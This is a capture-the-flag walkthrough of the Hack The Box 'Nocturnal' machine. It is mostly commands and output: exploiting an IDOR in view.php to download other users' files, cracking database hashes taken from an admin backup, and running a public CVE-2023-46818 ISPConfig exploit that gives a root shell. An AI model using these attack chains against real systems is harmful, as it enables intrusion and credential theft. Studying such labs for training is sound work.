# Target
| Category      | Details                                                    |
|---------------|------------------------------------------------------------|
| 📝 Name       | [Nocturnal](https://app.hackthebox.com/machines/Nocturnal) |
| 🏷 Type       | HTB Machine                                                |
| 🖥 **OS**     | Linux                                                      |
| 🎯 Difficulty | Easy                                                       |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ nmap -sS -sC $TARGET            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 10:18 CEST
Nmap scan report for 10.129.232.23
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://nocturnal.htb/

Nmap done: 1 IP address (1 host up) scanned in 3.83 seconds
```

`nmap` detected `nocturnal.htb` virtual host. Which could be confirmed with `curl`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ curl -I $TARGET            
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 13 Apr 2025 08:19:14 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://nocturnal.htb/
```

Let's add it to `/etc/hosts` and re-scan.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ echo "$TARGET nocturnal.htb" | sudo tee -a /etc/hosts
10.129.232.23 nocturnal.htb
```

```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ nmap -sS -sC -p80 nocturnal.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 10:20 CEST
Nmap scan report for nocturnal.htb (10.129.232.23)
Host is up (0.040s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal

Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```

# Foothold
With brief web-browsing we could find:
- http://nocturnal.htb/login.php - Login page
- http://nocturnal.htb/register.php - Register page
- support@nocturnal.htb - Support email address

Let's register and run directory fuzzing with `ffuf` in background.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ ffuf -r -u http://nocturnal.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 42ms]
login.php               [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 31ms]
register.php            [Status: 200, Size: 649, Words: 126, Lines: 22, Duration: 32ms]
view.php                [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 29ms]
uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 32ms]
admin.php               [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 27ms]
logout.php              [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 52ms]
dashboard.php           [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 33ms]
backups                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 43ms]
                        [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 25ms]
uploads2                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 33ms]
```

After registering and loging-in we have gained access to dashboard with file upload functionality. After uploading simple `.txt` file we have got `Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`, meaning that file type filtering is in place. Additionally `ffuf` have found particular interesting file upload related directories. We could easily bypass this filter by simply changing file extension. Knowing all that let's prepare set of `curl` commands for further enumeration. 

```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ curl -s http://nocturnal.htb/register.php -d 'username=user&password=pass' -o /dev/null; \
curl -s -c cookies.txt http://nocturnal.htb/login.php -d 'username=user&password=pass' -o /dev/null && \
echo "<p>Payload</p>" > payload.pdf && \
curl -b cookies.txt http://nocturnal.htb/dashboard.php -F "fileToUpload=@payload.pdf"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
                 <h1>Welcome, user</h1>

        <h2>Upload File</h2>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <button type="submit">Upload File</button>
        </form>

        <h2>Your Files</h2>
        <ul>
                            <li>
                    <a href="view.php?username=user&file=payload.pdf">
                        payload.pdf                    </a>
                    <span>(Uploaded on 2025-04-13 12:14:31)</span>
                </li>
                    </ul>

        <a href="logout.php" class="logout">Logout</a>
    </div>
</body>
</html>
```

With `payload.pdf` file uploaded we can see on dashboard URL to view it.
```
http://nocturnal.htb/view.php?username=user&file=payload.pdf
```

After short enumeration we could found that `view.php` script is vulnerable to Broken Access Control (kind of Insecure Direct Object Reference), as it does not check user provided in `username` parameter, meaning we could list / view files of other users. To exploit this we will use `ffuf`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=invalid.pdf" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -b "PHPSESSID=6adjc97m7u8jc2m99bijj0091v" -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=invalid.pdf
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=6adjc97m7u8jc2m99bijj0091v
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 64ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 53ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 58ms]
user                    [Status: 200, Size: 5674, Words: 1209, Lines: 129, Duration: 54ms]
```

We were able to find 2 additional users, `amanda` and `tobias`. While `tobias` (based on size of response, same as for `admin`) does not have any files, there should be something for `amanda`, let's find out with `curl`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ curl -b cookies.txt "http://nocturnal.htb/view.php?username=amanda&file=invalid.pdf"
<SNIP>
    <div class='error'>File does not exist.</div><h2>Available files for download:</h2><ul><li><a href="view.php?username=amanda&file=privacy.odt">privacy.odt</a></li></ul>
```

We can see that `amanda` uploaded `privacy.odt`, let's exfiltrate it and check it's content.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ wget --load-cookies=cookies.txt -O privacy.odt "http://nocturnal.htb/view.php?username=amanda&file=privacy.odt" -o /dev/null
```

As file seems to be corrupted as it can not be opened in LiberOffice (at least for me), we will simply unzip it check it's content 'manually'.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ unzip privacy.odt -d privacy
Archive:  privacy.odt
warning [privacy.odt]:  2919 extra bytes at beginning or within zipfile
  (attempting to process anyway)
 extracting: privacy/mimetype        
   creating: privacy/Configurations2/accelerator/
   creating: privacy/Configurations2/images/Bitmaps/
   creating: privacy/Configurations2/toolpanel/
   creating: privacy/Configurations2/floater/
   creating: privacy/Configurations2/statusbar/
   creating: privacy/Configurations2/toolbar/
   creating: privacy/Configurations2/progressbar/
   creating: privacy/Configurations2/popupmenu/
   creating: privacy/Configurations2/menubar/
  inflating: privacy/styles.xml      
  inflating: privacy/manifest.rdf    
  inflating: privacy/content.xml     
  inflating: privacy/meta.xml        
  inflating: privacy/settings.xml    
 extracting: privacy/Thumbnails/thumbnail.png  
  inflating: privacy/META-INF/manifest.xml 
```

With `privacy.odt` content extracted, let's `cat` thru `content.xml`
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ cat privacy/content.xml
<SNIP>
Dear <text:span text:style-name="T1">Amanda</text:span>,</text:p><text:p text:style-name="P1">Nocturnal has set the following temporary password for you: ****************. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
<SNIP>
```

We have found first credentials! Quick check shows that those are invalid for SSH access, but we could log in as `amanda` to web application, and what is more interesting this user has access to admin panel. With those privileges we are able to:
- Read `.php` files, which could be used this search for more exploitable vulnerabilities.
- Make application backup including used sqlite database.

As database should store credentials we will start with this attack vector using following combination.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ curl -c cookies.txt http://nocturnal.htb/login.php -d 'username=amanda&password=****************' && \
BACKUP=$(curl -s -b cookies.txt http://nocturnal.htb/admin.php -d 'backup=true&password=pass' | grep -oP "(?<=href=')[^']+\.zip") && \
curl -s -b cookies.txt http://nocturnal.htb/$BACKUP --output backup.zip && \
unzip -P pass backup.zip -d backup > /dev/null && \
sqlite3 backup/nocturnal_database.db "SELECT username, password FROM users" | sed 's/|/:/g' > nocturnal.hash && \
hashcat -m 0 --username --quiet nocturnal.hash /usr/share/wordlists/rockyou.txt > /dev/null;
hashcat -m 0 --username --show nocturnal.hash | awk -F: '{print $1 ":" $3}'
tobias:********************
```

And another credentials discovered! This time for `tobias`, let's check if this time we will have more luck with SSH.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ ssh tobias@nocturnal.htb
tobias@nocturnal.htb's password: 
<SNIP>
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
```

Foothold gained! Let's grab user flag and proceed to privileges escalation.

# Privileges escalation
With help of `linpeas` we could find that `root` is running some PHP application on loopback network interface
```
root        1018  0.0  0.7 212056 30584 ?        Ss   17:28   0:00 /usr/bin/php -S 127.0.0.1:8080
```

We can see it in `netstat` output as well
```
tobias@nocturnal:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0     36 10.129.21.4:22          10.10.14.212:42316      ESTABLISHED -                   
tcp        0      1 10.129.21.4:58268       8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:44525         127.0.0.53:53           ESTABLISHED -  
```

Let's forward 8080 to our machine and web-browse it.
```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ ssh -L 8080:localhost:8080 -Nf tobias@nocturnal.htb
tobias@nocturnal.htb's password: 
```

When entering http://127.0.0.1:8080 we land at login page of [ISPConfig](https://www.ispconfig.org/) application. With 'manual spraying' of known so far credentials, we could gain access for user `admin` using `tobias` password. After entering Help / Version page we can see that target is running `ISPConfig 3.2.10p1`. Using this information we are able to find [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818) vulnerability and [exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit) which we could use to escalate to root. Let's put all this intel together and grab root flag.

```
┌──(magicrc㉿perun)-[~/attack/HTB Nocturnal]
└─$ git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git && \
python3 ./CVE-2023-46818-python-exploit/exploit.py http://127.0.0.1:8080 admin ********************
Cloning into 'CVE-2023-46818-python-exploit'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 5.70 KiB | 5.70 MiB/s, done.
Resolving deltas: 100% (2/2), done.
[+] Target URL: http://127.0.0.1:8080/
[+] Logging in with username 'admin' and password '********************'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell# cat /root/root.txt
********************************
```